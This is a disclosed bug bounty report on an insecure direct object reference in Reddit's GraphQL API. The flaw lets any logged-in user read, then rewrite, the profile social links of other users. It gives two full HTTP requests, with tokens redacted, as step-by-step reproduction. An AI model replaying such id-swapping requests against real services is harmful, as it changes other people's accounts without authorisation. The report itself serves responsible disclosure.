# IDOR allows an attacker to modify the links of any user

## Report Details
- **Report ID**: 1661113
- **URL**: https://hackerone.com/reports/1661113
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-08-06T05:00:00.232Z
- **Disclosed**: 2022-09-30T15:09:18.437Z

## Reporter
- **Username**: criptex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
Hi team!

I found an IDOR which allows to modify the links of any user.
Users can put their custom links or social media links on their profile, ex:

{F1855366}

##To reproduce this:

- Replicate the following request by replacing it with your own authentication headers:
You must also put in the body of the request, in the parameter "username" the username that you want,  you can try my username: "criptexhackerone1".
This request will return in the response the links of any user profile with the "id" of each link.


```
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36
X-Reddit-Compression: 1
X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://www.reddit.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.reddit.com/
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5

{"id":"11a239b07f86","variables":{"username":"*********"}}
```

- When you get some "id" save it.
- In the next request you have to put in the request body, in the "id" parameter the previously saved id, you can also change the name and the link:

```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 173
X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *
Referer: https://www.reddit.com/
Te: trailers

{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"https://www.hackerone.com","title":"hacker","type":"CUSTOM","id":"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *"}]}}}
```
- Finally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.

## Impact

A real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.

Best Regards!!!

## Attachments
- links.png
